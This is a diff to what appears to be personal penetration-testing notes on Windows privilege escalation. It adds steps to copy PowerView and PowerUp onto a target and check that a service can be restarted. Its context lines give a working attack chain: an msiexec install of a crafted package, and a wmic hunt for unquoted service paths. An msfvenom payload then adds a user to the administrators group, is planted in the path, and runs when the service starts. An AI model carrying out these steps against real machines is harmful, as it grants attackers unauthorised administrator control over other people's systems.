@@ -11,6 +11,7 @@ Back on msfconsole type -- sessions 1 <br>
 Could now type -- run /post/multi/recon/local_exploit_suggestor, use exploits suggested. 
 
 <h2>pre requists </h2>
+Move Powerview.ps1 to machine and invoke all checks <br>
 
 <h3>If on a box check perms and check other users</h3>
 whoami /priv
@@ -102,9 +103,11 @@ msiexec /quiet /qn /i /pathtosoftwarecreated
 
 <h2>unquoted service paths</h2>
 Run winpeas and check for any unquoted service paths <br>
+Can try move powerview to the machine and run powerview or powerup.ps1 - Invoke-AllChecks. PowerView.ps1 - Get-ServiceUnquoted
 if winpeas wont work try run <br>
 wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ <br>
 for example if path -- C:\Program Files\unquoted path\Common Files <br>
+Ensure you can stop and start service you are attacking -- sc query servicename <br>
 create exe - common.exe  -- msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe <br>
 place in C:\Program Files\unquoted path (this ovbiously changes path for what you found) <br>
 call service   -- sc start servicename <br>
